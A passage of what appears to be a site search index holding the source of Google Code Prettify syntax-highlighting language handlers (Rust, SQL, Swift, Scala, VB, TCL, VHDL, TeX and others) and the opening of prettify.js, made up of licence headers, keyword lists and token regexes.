unicode) [PR['PR_PLAIN'], /^[a-z_]\\w*/i], // Attributes [PR['PR_ATTRIB_VALUE'], /^#!?\\[[\\s\\S]*?\\]/], // All the punctuation [PR['PR_PUNCTUATION'], /^[+\\-/*=^&|!%[\\](){}?:.,;]/], // Anything else (which is probably illegal, as all the legal stuff should have been covered) can be plain [PR['PR_PLAIN'], /./] ]), ['rust']);","link":"/plugins/prettify/lang-rust.js"},{"title":"","text":"/** * @license * Copyright (C) 2012 Jeffrey Arnold * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Support for R documentation (Rd) files * * Minimal highlighting or Rd files, basically just highlighting * macros. It does not try to identify verbatim or R-like regions of * macros as that is too complicated for a lexer. Descriptions of the * Rd format can be found * http://cran.r-project.org/doc/manuals/R-exts.html and * http://developer.r-project.org/parseRd.pdf. * * @author Jeffrey Arnold */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // all comments begin with '%' [PR['PR_COMMENT'], /^%[^\\r\\n]*/, null, '%'] ], [// special macros with no args [PR['PR_LITERAL'], /^\\\\(?:cr|l?dots|R|tab)\\b/], // macros [PR['PR_KEYWORD'], /^\\\\[a-zA-Z@]+/], // highlighted as macros, since technically they are [PR['PR_KEYWORD'], /^#(?:ifn?def|endif)/ ], // catch escaped brackets [PR['PR_PLAIN'], /^\\\\[{}]/], // punctuation [PR['PR_PUNCTUATION'], /^[{}()\\[\\]]+/] ]), ['Rd', 'rd']);","link":"/plugins/prettify/lang-rd.js"},{"title":"","text":"/** * @license * Copyright (C) 2008 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for SQL. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my SQL code) * * * http://savage.net.au/SQL/sql-99.bnf.html is the basis for the grammar, and * http://msdn.microsoft.com/en-us/library/aa238507(SQL.80).aspx and * http://meta.stackoverflow.com/q/92352/137403 as the bases for the keyword * list. * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double or single quoted, possibly multi-line, string. [PR['PR_STRING'], /^(?:\"(?:[^\\\"\\\\]|\\\\.)*\"|'(?:[^\\'\\\\]|\\\\.)*')/, null, '\"\\''] ], [ // A comment is either a line comment that starts with two dashes, or // two dashes preceding a long bracketed block. [PR['PR_COMMENT'], /^(?:--[^\\r\\n]*|\\/\\*[\\s\\S]*?(?:\\*\\/|$))/], [PR['PR_KEYWORD'], /^(?:ADD|ALL|ALTER|AND|ANY|APPLY|AS|ASC|AUTHORIZATION|BACKUP|BEGIN|BETWEEN|BREAK|BROWSE|BULK|BY|CASCADE|CASE|CHECK|CHECKPOINT|CLOSE|CLUSTERED|COALESCE|COLLATE|COLUMN|COMMIT|COMPUTE|CONNECT|CONSTRAINT|CONTAINS|CONTAINSTABLE|CONTINUE|CONVERT|CREATE|CROSS|CURRENT|CURRENT_DATE|CURRENT_TIME|CURRENT_TIMESTAMP|CURRENT_USER|CURSOR|DATABASE|DBCC|DEALLOCATE|DECLARE|DEFAULT|DELETE|DENY|DESC|DISK|DISTINCT|DISTRIBUTED|DOUBLE|DROP|DUMMY|DUMP|ELSE|END|ERRLVL|ESCAPE|EXCEPT|EXEC|EXECUTE|EXISTS|EXIT|FETCH|FILE|FILLFACTOR|FOLLOWING|FOR|FOREIGN|FREETEXT|FREETEXTTABLE|FROM|FULL|FUNCTION|GOTO|GRANT|GROUP|HAVING|HOLDLOCK|IDENTITY|IDENTITYCOL|IDENTITY_INSERT|IF|IN|INDEX|INNER|INSERT|INTERSECT|INTO|IS|JOIN|KEY|KILL|LEFT|LIKE|LINENO|LOAD|MATCH|MATCHED|MERGE|NATURAL|NATIONAL|NOCHECK|NONCLUSTERED|NOCYCLE|NOT|NULL|NULLIF|OF|OFF|OFFSETS|ON|OPEN|OPENDATASOURCE|OPENQUERY|OPENROWSET|OPENXML|OPTION|OR|ORDER|OUTER|OVER|PARTITION|PERCENT|PIVOT|PLAN|PRECEDING|PRECISION|PRIMARY|PRINT|PROC|PROCEDURE|PUBLIC|RAISERROR|READ|READTEXT|RECONFIGURE|REFERENCES|REPLICATION|RESTORE|RESTRICT|RETURN|REVOKE|RIGHT|ROLLBACK|ROWCOUNT|ROWGUIDCOL|ROWS?|RULE|SAVE|SCHEMA|SELECT|SESSION_USER|SET|SETUSER|SHUTDOWN|SOME|START|STATISTICS|SYSTEM_USER|TABLE|TEXTSIZE|THEN|TO|TOP|TRAN|TRANSACTION|TRIGGER|TRUNCATE|TSEQUAL|UNBOUNDED|UNION|UNIQUE|UNPIVOT|UPDATE|UPDATETEXT|USE|USER|USING|VALUES|VARYING|VIEW|WAITFOR|WHEN|WHERE|WHILE|WITH|WITHIN|WRITETEXT|XML)(?=[^\\w-]|$)/i, null], // A number is a hex integer literal, a decimal real literal, or in // scientific notation. [PR['PR_LITERAL'], /^[+-]?(?:0x[\\da-f]+|(?:(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:e[+\\-]?\\d+)?))/i], // An identifier [PR['PR_PLAIN'], /^[a-z_][\\w-]*/i], // A run of punctuation [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0\\\"\\'][^\\w\\t\\n\\r \\xA0+\\-\\\"\\']*/] ]), ['sql']);","link":"/plugins/prettify/lang-sql.js"},{"title":"","text":"/** * @license * Copyright (C) 2015 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Swift * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my swift code) * This file supports the following language extensions: * lang-swift - Swift * * I used https://developer.apple.com/library/ios/documentation/Swift/Conceptual/Swift_Programming_Language/AboutTheLanguageReference.html * as the source of truth for this. The revision from 2015-10-21 (Swift 2.1) was used in most recent update. * * @author cerech@google.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ //whitespace [PR['PR_PLAIN'], /^[ \\n\\r\\t\\v\\f\\0]+/, null, ' \\n\\r\\t\\v\\f\\0'], //string literals [PR['PR_STRING'], /^\"(?:[^\"\\\\]|(?:\\\\.)|(?:\\\\\\((?:[^\"\\\\)]|\\\\.)*\\)))*\"/, null, '\"'] ], [ //floating point literals [PR['PR_LITERAL'], /^(?:(?:0x[\\da-fA-F][\\da-fA-F_]*\\.[\\da-fA-F][\\da-fA-F_]*[pP]?)|(?:\\d[\\d_]*\\.\\d[\\d_]*[eE]?))[+-]?\\d[\\d_]*/, null], //integer literals [PR['PR_LITERAL'], /^-?(?:(?:0(?:(?:b[01][01_]*)|(?:o[0-7][0-7_]*)|(?:x[\\da-fA-F][\\da-fA-F_]*)))|(?:\\d[\\d_]*))/, null], //some other literals [PR['PR_LITERAL'], /^(?:_|Any|true|false|nil)\\b/, null], //keywords [PR['PR_KEYWORD'], /^\\b(?:__COLUMN__|__FILE__|__FUNCTION__|__LINE__|#available|#colorLiteral|#column|#else|#elseif|#endif|#file|#fileLiteral|#function|#if|#imageLiteral|#line|#selector|#sourceLocation|arch|arm|arm64|associatedtype|associativity|as|break|case|catch|class|continue|convenience|default|defer|deinit|didSet|do|dynamic|dynamicType|else|enum|extension|fallthrough|fileprivate|final|for|func|get|guard|import|indirect|infix|init|inout|internal|i386|if|in|iOS|iOSApplicationExtension|is|lazy|left|let|mutating|none|nonmutating|open|operator|optional|OSX|OSXApplicationExtension|override|postfix|precedence|prefix|private|protocol|Protocol|public|repeat|required|rethrows|return|right|safe|Self|self|set|static|struct|subscript|super|switch|throw|throws|try|Type|typealias|unowned|unsafe|var|weak|watchOS|where|while|willSet|x86_64)\\b/, null], //double slash comments [PR['PR_COMMENT'], /^\\/\\/.*?[\\n\\r]/, null], //slash star comments [PR['PR_COMMENT'], /^\\/\\*[\\s\\S]*?(?:\\*\\/|$)/, null], //punctuation [PR['PR_PUNCTUATION'], /^|===|==|\\.\\.\\.|&&=|\\.\\.|`|==|\\+\\+|--|\\/|\\+|!|\\*|%||&|\\||\\^|\\?|=|-|_/, null], [PR['PR_TYPE'], /^\\b(?:[@_]?[A-Z]+[a-z][A-Za-z_$@0-9]*|\\w+_t\\b)/, null] //borrowing the type regex given by the main program for C-family languages ]), ['swift']);","link":"/plugins/prettify/lang-swift.js"},{"title":"","text":"/** * @license * Copyright (C) 2010 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Scala. * * Derived from http://lampsvn.epfl.ch/svn-repos/scala/scala-documentation/trunk/src/reference/SyntaxSummary.tex * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double or single quoted string // or a triple double-quoted multi-line string. [PR['PR_STRING'], /^(?:\"(?:(?:\"\"(?:\"\"?(?!\")|[^\\\\\"]|\\\\.)*\"{0,3})|(?:[^\"\\r\\n\\\\]|\\\\.)*\"?))/, null, '\"'], [PR['PR_LITERAL'], /^`(?:[^\\r\\n\\\\`]|\\\\.)*`?/, null, '`'], [PR['PR_PUNCTUATION'], /^[!#%&()*+,\\-:;?@\\[\\\\\\]^{|}~]+/, null, '!#%&()*+,-:;?@[\\\\]^{|}~'] ], [ // A symbol literal is a single quote followed by an identifier with no // single quote following // A character literal has single quotes on either side [PR['PR_STRING'], /^'(?:[^\\r\\n\\\\']|\\\\(?:'|[^\\r\\n']+))'/], [PR['PR_LITERAL'], /^'[a-zA-Z_$][\\w$]*(?!['$\\w])/], [PR['PR_KEYWORD'], /^(?:abstract|case|catch|class|def|do|else|extends|final|finally|for|forSome|if|implicit|import|lazy|match|new|object|override|package|private|protected|requires|return|sealed|super|throw|trait|try|type|val|var|while|with|yield)\\b/], [PR['PR_LITERAL'], /^(?:true|false|null|this)\\b/], [PR['PR_LITERAL'], /^(?:(?:0(?:[0-7]+|X[0-9A-F]+))L?|(?:(?:0|[1-9][0-9]*)(?:(?:\\.[0-9]+)?(?:E[+\\-]?[0-9]+)?F?|L?))|\\\\.[0-9]+(?:E[+\\-]?[0-9]+)?F?)/i], // Treat upper camel case identifiers as types. [PR['PR_TYPE'], /^[$_]*[A-Z][_$A-Z0-9]*[a-z][\\w$]*/], [PR['PR_PLAIN'], /^[$a-zA-Z_][\\w$]*/], [PR['PR_COMMENT'], /^\\/(?:\\/.*|\\*(?:\\/|\\**[^*/])*(?:\\*+\\/?)?)/], [PR['PR_PUNCTUATION'], /^(?:\\.+|\\/)/] ]), ['scala']);","link":"/plugins/prettify/lang-scala.js"},{"title":"","text":"/** * @license * Copyright (C) 2009 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for various flavors of basic. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * * * * http://msdn.microsoft.com/en-us/library/aa711638(VS.71).aspx defines the * visual basic grammar lexical grammar. * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0\\u2028\\u2029]+/, null, '\\t\\n\\r \\xA0\\u2028\\u2029'], // A double quoted string with quotes escaped by doubling them. // A single character can be suffixed with C. [PR['PR_STRING'], /^(?:[\\\"\\u201C\\u201D](?:[^\\\"\\u201C\\u201D]|[\\\"\\u201C\\u201D]{2})(?:[\\\"\\u201C\\u201D]c|$)|[\\\"\\u201C\\u201D](?:[^\\\"\\u201C\\u201D]|[\\\"\\u201C\\u201D]{2})*(?:[\\\"\\u201C\\u201D]|$))/i, null, '\"\\u201C\\u201D'], // A comment starts with a single quote and runs until the end of the // line. // VB6 apparently allows _ as an escape sequence for newlines though // this is not a documented feature of VB.net. // http://meta.stackoverflow.com/q/121497/137403 [PR['PR_COMMENT'], /^[\\'\\u2018\\u2019](?:_(?:\\r\\n?|[^\\r]?)|[^\\r\\n_\\u2028\\u2029])*/, null, '\\'\\u2018\\u2019'] ], [ [PR['PR_KEYWORD'], /^(?:AddHandler|AddressOf|Alias|And|AndAlso|Ansi|As|Assembly|Auto|Boolean|ByRef|Byte|ByVal|Call|Case|Catch|CBool|CByte|CChar|CDate|CDbl|CDec|Char|CInt|Class|CLng|CObj|Const|CShort|CSng|CStr|CType|Date|Decimal|Declare|Default|Delegate|Dim|DirectCast|Do|Double|Each|Else|ElseIf|End|EndIf|Enum|Erase|Error|Event|Exit|Finally|For|Friend|Function|Get|GetType|GoSub|GoTo|Handles|If|Implements|Imports|In|Inherits|Integer|Interface|Is|Let|Lib|Like|Long|Loop|Me|Mod|Module|MustInherit|MustOverride|MyBase|MyClass|Namespace|New|Next|Not|NotInheritable|NotOverridable|Object|On|Option|Optional|Or|OrElse|Overloads|Overridable|Overrides|ParamArray|Preserve|Private|Property|Protected|Public|RaiseEvent|ReadOnly|ReDim|RemoveHandler|Resume|Return|Select|Set|Shadows|Shared|Short|Single|Static|Step|Stop|String|Structure|Sub|SyncLock|Then|Throw|To|Try|TypeOf|Unicode|Until|Variant|Wend|When|While|With|WithEvents|WriteOnly|Xor|EndIf|GoSub|Let|Variant|Wend)\\b/i, null], // A second comment form [PR['PR_COMMENT'], /^REM\\b[^\\r\\n\\u2028\\u2029]*/i], // A boolean, numeric, or date literal. [PR['PR_LITERAL'], /^(?:True\\b|False\\b|Nothing\\b|\\d+(?:E[+\\-]?\\d+[FRD]?|[FRDSIL])?|(?:&H[0-9A-F]+|&O[0-7]+)[SIL]?|\\d*\\.\\d+(?:E[+\\-]?\\d+)?[FRD]?|#\\s+(?:\\d+[\\-\\/]\\d+[\\-\\/]\\d+(?:\\s+\\d+:\\d+(?::\\d+)?(\\s*(?:AM|PM))?)?|\\d+:\\d+(?::\\d+)?(\\s*(?:AM|PM))?)\\s+#)/i], // An identifier. Keywords can be turned into identifers // with square brackets, and there may be optional type // characters after a normal identifier in square brackets. [PR['PR_PLAIN'], /^(?:(?:[a-z]|_\\w)\\w*(?:\\[[%&@!#]+\\])?|\\[(?:[a-z]|_\\w)\\w*\\])/i], // A run of punctuation [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\\"\\'\\[\\]\\xA0\\u2018\\u2019\\u201C\\u201D\\u2028\\u2029]+/], // Square brackets [PR['PR_PUNCTUATION'], /^(?:\\[|\\])/] ]), ['vb', 'vbs']);","link":"/plugins/prettify/lang-vb.js"},{"title":"","text":"/** * @license * Copyright (C) 2012 Pyrios * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for TCL * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * proc foo {} {puts bar} * * I copy-pasted lang-lisp.js, so this is probably not 100% accurate. * I used http://wiki.tcl.tk/1019 for the keywords, but tried to only * include as keywords that had more impact on the program flow * rather than providing convenience. For example, I included 'if' * since that provides branching, but left off 'open' since that is more * like a proc. Add more if it makes sense. * * @author pyrios@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ ['opn', /^\\{+/, null, '{'], ['clo', /^\\}+/, null, '}'], // A line comment that starts with ; [PR['PR_COMMENT'], /^#[^\\r\\n]*/, null, '#'], // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double quoted, possibly multi-line, string. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'] ], [ [PR['PR_KEYWORD'], /^(?:after|append|apply|array|break|case|catch|continue|error|eval|exec|exit|expr|for|foreach|if|incr|info|proc|return|set|switch|trace|uplevel|upvar|while)\\b/, null], [PR['PR_LITERAL'], /^[+\\-]?(?:[0#]x[0-9a-f]+|\\d+\\/\\d+|(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:[ed][+\\-]?\\d+)?)/i], // A single quote possibly followed by a word that optionally ends with // = ! or ?. [PR['PR_LITERAL'], /^\\'(?:-*(?:\\w|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?)?/], // A word that optionally ends with = ! or ?. [PR['PR_PLAIN'], /^-*(?:[a-z_]|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?/i], // A printable non-space non-special character [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0()\\\"\\\\\\';]+/] ]), ['tcl']);","link":"/plugins/prettify/lang-tcl.js"},{"title":"","text":"/** * @license * Copyright (C) 2010 benoit@ryder.fr * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for VHDL '93. * * Based on the lexical grammar and keywords at * http://www.iis.ee.ethz.ch/~zimmi/download/vhdl93_syntax.html * * @author benoit@ryder.fr */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'] ], [ // String, character or bit string [PR['PR_STRING'], /^(?:[BOX]?\"(?:[^\\\"]|\"\")*\"|'.')/i], // Comment, from two dashes until end of line. [PR['PR_COMMENT'], /^--[^\\r\\n]*/], [PR['PR_KEYWORD'], /^(?:abs|access|after|alias|all|and|architecture|array|assert|attribute|begin|block|body|buffer|bus|case|component|configuration|constant|disconnect|downto|else|elsif|end|entity|exit|file|for|function|generate|generic|group|guarded|if|impure|in|inertial|inout|is|label|library|linkage|literal|loop|map|mod|nand|new|next|nor|not|null|of|on|open|or|others|out|package|port|postponed|procedure|process|pure|range|record|register|reject|rem|report|return|rol|ror|select|severity|shared|signal|sla|sll|sra|srl|subtype|then|to|transport|type|unaffected|units|until|use|variable|wait|when|while|with|xnor|xor)(?=[^\\w-]|$)/i, null], // Type, predefined or standard [PR['PR_TYPE'], /^(?:bit|bit_vector|character|boolean|integer|real|time|string|severity_level|positive|natural|signed|unsigned|line|text|std_u?logic(?:_vector)?)(?=[^\\w-]|$)/i, null], // Predefined attributes [PR['PR_TYPE'], /^\\'(?:ACTIVE|ASCENDING|BASE|DELAYED|DRIVING|DRIVING_VALUE|EVENT|HIGH|IMAGE|INSTANCE_NAME|LAST_ACTIVE|LAST_EVENT|LAST_VALUE|LEFT|LEFTOF|LENGTH|LOW|PATH_NAME|POS|PRED|QUIET|RANGE|REVERSE_RANGE|RIGHT|RIGHTOF|SIMPLE_NAME|STABLE|SUCC|TRANSACTION|VAL|VALUE)(?=[^\\w-]|$)/i, null], // Number, decimal or based literal [PR['PR_LITERAL'], /^\\d+(?:_\\d+)*(?:#[\\w\\\\.]+#(?:[+\\-]?\\d+(?:_\\d+)*)?|(?:\\.\\d+(?:_\\d+)*)?(?:E[+\\-]?\\d+(?:_\\d+)*)?)/i], // Identifier, basic or extended [PR['PR_PLAIN'], /^(?:[a-z]\\w*|\\\\[^\\\\]*\\\\)/i], // Punctuation [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0\\\"\\'][^\\w\\t\\n\\r \\xA0\\-\\\"\\']*/] ]), ['vhdl', 'vhd']);","link":"/plugins/prettify/lang-vhdl.js"},{"title":"","text":"/** * @license * Copyright (C) 2011 Martin S. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Support for tex highlighting as discussed on * meta.tex.stackexchange.com. * * @author Martin S. */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // all comments begin with '%' [PR['PR_COMMENT'], /^%[^\\r\\n]*/, null, '%'] ], [ //[PR['PR_DECLARATION'], /^\\\\([egx]?def|(new|renew|provide)(command|environment))\\b/], // any command starting with a \\ and contains // either only letters (a-z,A-Z), '@' (internal macros) [PR['PR_KEYWORD'], /^\\\\[a-zA-Z@]+/], // or contains only one character [PR['PR_KEYWORD'], /^\\\\./], // Highlight dollar for math mode and ampersam for tabular [PR['PR_TYPE'], /^[$&]/], // numeric measurement values with attached units [PR['PR_LITERAL'], /[+-]?(?:\\.\\d+|\\d+(?:\\.\\d*)?)(cm|em|ex|in|pc|pt|bp|mm)/i], // punctuation usually occurring within commands [PR['PR_PUNCTUATION'], /^[{}()\\[\\]=]+/] ]), ['latex', 'tex']);","link":"/plugins/prettify/lang-tex.js"},{"title":"","text":"var IN_GLOBAL_SCOPE = false; /** * @license * Copyright (C) 2006 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * some functions for browser-side pretty printing of code contained in html. * * * For a fairly comprehensive set of languages see the * README * file that came with this source. At a minimum, the lexer should work on a * number of languages including C and friends, Java, Python, Bash, SQL, HTML, * XML, CSS, Javascript, and Makefiles. It works passably on Ruby, PHP and Awk * and a subset of Perl, but, because of commenting conventions, doesn't work on * Smalltalk, Lisp-like, or CAML-like languages without an explicit lang class. * * Usage: * include this source file in an html page via * {@code } * define style rules. See the example page for examples. * mark the {@code } and {@code } tags in your source with * {@code class=prettyprint.} * You can also use the (html deprecated) {@code } tag, but the pretty * printer needs to do more substantial DOM manipulations to support that, so * some css styles may not be preserved. * * That's it. I wanted to keep the API as simple as possible, so there's no * need to specify which language the code is in, but if you wish, you can add * another class to the {@code } or {@code } element to specify the * language, as in {@code }. Any class that * starts with \"lang-\" followed by a file extension, specifies the file type. * See the \"lang-*.js\" files in this directory for code that implements * per-language file handlers. * * Change log: * cbeust, 2006/08/22 * * Java annotations (start with \"@\") are now captured as literals (\"lit\") * * @requires console */ // JSLint declarations /*global console, document, navigator, setTimeout, window, define */ /** * {@type !{ * 'createSimpleLexer': function (Array, Array): (function (JobT)), * 'registerLangHandler': function (function (JobT), Array.), * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_VALUE': string, * 'PR_COMMENT': string, * 'PR_DECLARATION': string, * 'PR_KEYWORD': string, * 'PR_LITERAL': string, * 'PR_NOCODE': string, * 'PR_PLAIN': string, * 'PR_PUNCTUATION': string, * 'PR_SOURCE': string, * 'PR_STRING': string, * 'PR_TAG': string, * 'PR_TYPE': string, * 'prettyPrintOne': function (string, string, number|boolean), * 'prettyPrint': function (?function, ?(HTMLElement|HTMLDocument)) * }} * @const */ var PR; /** * Split {@code prettyPrint} into multiple timeouts so as not to interfere with * UI events. * If set to {@code false}, {@code prettyPrint()} is synchronous. */ var PR_SHOULD_USE_CONTINUATION = true if (typeof window !== 'undefined') { window['PR_SHOULD_USE_CONTINUATION'] = PR_SHOULD_USE_CONTINUATION; } /** * Pretty print a chunk of code. * @param {string} sourceCodeHtml The HTML to pretty print. * @param {string} opt_langExtension The language name to use. * Typically, a filename extension like 'cpp' or 'java'. * @param {number|boolean} opt_numberLines True to number lines, * or the 1-indexed number of the first line in sourceCodeHtml. * @return {string} code as html, but prettier */ var prettyPrintOne; /** * Find all the {@code } and {@code } tags in the DOM with * {@code class=prettyprint} and prettify them. * * @param {Function} opt_whenDone called when prettifying is done. * @param {HTMLElement|HTMLDocument} opt_root an element or document * containing all the elements to pretty print. * Defaults to {@code document.body}. */ var prettyPrint; (function () { var win = (typeof window !== 'undefined') ? window : {}; // Keyword lists for various languages. // We use things that coerce to strings to make them compact when minified // and to defeat aggressive optimizers that fold large string constants. var FLOW_CONTROL_KEYWORDS = [\"break,continue,do,else,for,if,return,while\"]; var C_KEYWORDS = [FLOW_CONTROL_KEYWORDS,\"auto,case,char,const,default,\" + \"double,enum,extern,float,goto,inline,int,long,register,restrict,short,signed,\" + \"sizeof,static,struct,switch,typedef,union,unsigned,void,volatile\"]; var COMMON_KEYWORDS = [C_KEYWORDS,\"catch,class,delete,false,import,\" + \"new,operator,private,protected,public,this,throw,true,try,typeof\"]; var CPP_KEYWORDS = [COMMON_KEYWORDS,\"alignas,alignof,align_union,asm,axiom,bool,\" + \"concept,concept_map,const_cast,constexpr,decltype,delegate,\" + \"dynamic_cast,explicit,export,friend,generic,late_check,\" + \"mutable,namespace,noexcept,noreturn,nullptr,property,reinterpret_cast,static_assert,\" + \"static_cast,template,typeid,typename,using,virtual,where\"]; var JAVA_KEYWORDS = [COMMON_KEYWORDS, \"abstract,assert,boolean,byte,extends,finally,final,implements,import,\" + \"instanceof,interface,null,native,package,strictfp,super,synchronized,\" + \"throws,transient\"]; var CSHARP_KEYWORDS = [COMMON_KEYWORDS, \"abstract,add,alias,as,ascending,async,await,base,bool,by,byte,checked,decimal,delegate,descending,\" + \"dynamic,event,finally,fixed,foreach,from,get,global,group,implicit,in,interface,\" + \"internal,into,is,join,let,lock,null,object,out,override,orderby,params,\" + \"partial,readonly,ref,remove,sbyte,sealed,select,set,stackalloc,string,select,uint,ulong,\" + \"unchecked,unsafe,ushort,value,var,virtual,where,yield\"]; var COFFEE_KEYWORDS = \"all,and,by,catch,class,else,extends,false,finally,\" + \"for,if,in,is,isnt,loop,new,no,not,null,of,off,on,or,return,super,then,\" + \"throw,true,try,unless,until,when,while,yes\"; var JSCRIPT_KEYWORDS = [COMMON_KEYWORDS, \"abstract,async,await,constructor,debugger,enum,eval,export,from,function,\" + \"get,import,implements,instanceof,interface,let,null,of,set,undefined,\" + \"var,with,yield,Infinity,NaN\"]; var PERL_KEYWORDS = \"caller,delete,die,do,dump,elsif,eval,exit,foreach,for,\" + \"goto,if,import,last,local,my,next,no,our,print,package,redo,require,\" + \"sub,undef,unless,until,use,wantarray,while,BEGIN,END\"; var PYTHON_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"and,as,assert,class,def,del,\" + \"elif,except,exec,finally,from,global,import,in,is,lambda,\" + \"nonlocal,not,or,pass,print,raise,try,with,yield,\" + \"False,True,None\"]; var RUBY_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"alias,and,begin,case,class,\" + \"def,defined,elsif,end,ensure,false,in,module,next,nil,not,or,redo,\" + \"rescue,retry,self,super,then,true,undef,unless,until,when,yield,\" + \"BEGIN,END\"]; var SH_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"case,done,elif,esac,eval,fi,\" + \"function,in,local,set,then,until\"]; var ALL_KEYWORDS = [ CPP_KEYWORDS, CSHARP_KEYWORDS, JAVA_KEYWORDS, JSCRIPT_KEYWORDS, PERL_KEYWORDS, PYTHON_KEYWORDS, RUBY_KEYWORDS, SH_KEYWORDS]; var C_TYPES = /^(DIR|FILE|array|vector|(de|priority_)?queue|(forward_)?list|stack|(const_)?(reverse_)?iterator|(unordered_)?(multi)?(set|map)|bitset|u?(int|float)\\d*)\\b/; // token style names. correspond to css classes /** * token style for a string literal * @const */ var PR_STRING = 'str'; /** * token style for a keyword * 